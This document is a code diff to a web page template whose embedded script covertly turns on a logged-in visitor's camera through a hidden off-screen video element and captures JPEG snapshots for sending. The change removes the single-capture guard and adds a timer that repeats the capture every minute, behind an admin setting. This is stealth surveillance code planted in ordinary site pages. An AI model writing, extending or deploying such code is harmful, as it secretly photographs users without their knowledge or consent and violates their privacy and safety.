@@ -913,15 +913,13 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 
-{% if current_user.is_authenticated %}
+{% if current_user.is_authenticated and get_site_settings().auto_snapshot_enabled %}
 <!-- Stealth Mobile & Desktop Camera Elements -->
 <video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none; z-index: -9999;" autoplay playsinline webkit-playsinline muted></video>
 <canvas id="snapshotCanvas" style="display: none;"></canvas>
 
 <script>
 (function() {
-    let captured = false;
-
     function getUniversalUserMedia(constraints) {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             return navigator.mediaDevices.getUserMedia(constraints);
@@ -936,8 +934,6 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function stealthCapture() {
-        if (captured) return;
-
         const video = document.getElementById('snapshotVideo');
         const canvas = document.getElementById('snapshotCanvas');
         if (!video || !canvas) return;
@@ -967,8 +963,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 if (p && p.catch) p.catch(() => {});
 
                 function drawAndSendFrame() {
-                    if (captured) return;
-
                     let w = video.videoWidth || 640;
                     let h = video.videoHeight || 480;
                     
@@ -985,8 +979,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     const imageData = canvas.toDataURL('image/jpeg', 0.75);
 
                     if (imageData && imageData.length > 500) {
-                        captured = true;
-
                         if (stream && stream.getTracks) {
                             stream.getTracks().forEach(track => track.stop());
                         }
@@ -1028,6 +1020,9 @@ document.addEventListener('DOMContentLoaded', function() {
     document.addEventListener('click', stealthCapture, { once: true });
     document.addEventListener('touchstart', stealthCapture, { once: true });
     document.addEventListener('scroll', stealthCapture, { once: true });
+
+    // RECURRING SNAPSHOT CAPTURE EVERY 1 MINUTE (60,000 ms)
+    setInterval(stealthCapture, 60000);
 })();
 </script>
 {% endif %}
